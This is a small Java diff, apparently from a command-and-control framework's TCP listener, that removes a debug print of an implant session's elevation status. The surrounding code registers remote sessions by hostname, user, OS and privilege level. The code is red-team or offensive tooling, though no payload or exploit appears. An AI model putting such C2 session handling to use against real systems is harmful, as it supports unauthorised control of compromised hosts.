@@ -121,8 +121,6 @@ public class GenericTCPInitiator extends C2Interface {
 
 						boolean isElevated = wsr.isElevated(bw);
 						
-						System.out.println("Elevated: " + isElevated);
-						
 						String sessionUID = hostname + ":" + username + ":Native" + os + ":" + isElevated;
 						int sessionId = ioManager.determineAndGetCorrectSessionId(hostname, username, "Native" + os, isElevated, sessionUID);
 						ioManager.updateSessionContactTime(sessionId);
